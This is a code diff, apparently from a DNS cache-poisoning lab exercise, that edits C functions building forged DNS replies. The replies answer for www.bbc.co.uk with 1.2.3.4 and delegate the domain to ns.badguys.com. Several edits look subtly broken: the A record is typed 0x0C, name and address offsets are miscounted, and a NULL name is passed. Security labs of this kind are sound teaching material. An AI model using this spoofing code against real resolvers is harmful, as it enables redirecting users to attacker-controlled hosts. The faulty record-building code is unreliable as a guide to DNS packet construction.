@@ -103,13 +103,17 @@ void spoof_DNS_reply(struct ipheader* ip)
 /*Construct DNS Header and Records. Return the size (Header + Records)*/
 unsigned short construct_dns_reply(char *buffer)
 {
+	
+
+
+	struct dnsheader *dns = (struct dnsheader *) buffer;
+
+	char *copyOfP = buffer + 12;
+
 	char TARGET_DOMAIN[] = "www.bbc.co.uk";
 	char ANSWER_IPADDR[] = "1.2.3.4";
 	char NS_SERVER[] = "ns.badguys.com";
 	char NS_IPADDR[] = "1.2.3.5";
-
-
-	struct dnsheader *dns = (struct dnsheader *) buffer;
 
 	//construct the DNS header:
 	dns->flags=htons(0x8400); //Flag = response; this is a DNS response
@@ -128,7 +132,7 @@ unsigned short construct_dns_reply(char *buffer)
 
 	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)
 
-	p += set_A_record(p, TARGET_DOMAIN, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
+	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
 	p += set_NS_record(p, TARGET_DOMAIN, 0, NS_SERVER); //Add an NS record (Authority section)
 	//p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
 	//printf("dns Length is %i",(p - buffer));
@@ -149,23 +153,23 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 		p++;
 	} else {
 		strcpy(p, name);
-		p += strlen(name)  + 1;
+		p += strlen(name);
 	}
 
-	*((unsigned short *)p ) = htons(0x0001);	//Record Type
+	*((unsigned short *)p ) = htons(0x0C);	//Record Type
 	p += 2;
 
-	*((unsigned short *)p ) = htons(0x0001);	//Class
+	*((unsigned short *)p ) = htons(0x01);	//Class
 	p += 2;
 
-	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live
+	*((unsigned int *)p ) = htonl(0x2222);	//Time to Live
 	p += 4;
 
-	*((unsigned short *)p ) = htons(0x0004);	//Data Length (always 4. 1 byte per ip addr section)
+	*((unsigned short *)p ) = htons(0x04);	//Data Length (always 4. 1 byte per ip addr section)
 	p += 2;
 
 	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
-	p += 4;
+	p += 5;
 	//printf("A record is %i", \n, );
 	return (p-buffer);
 
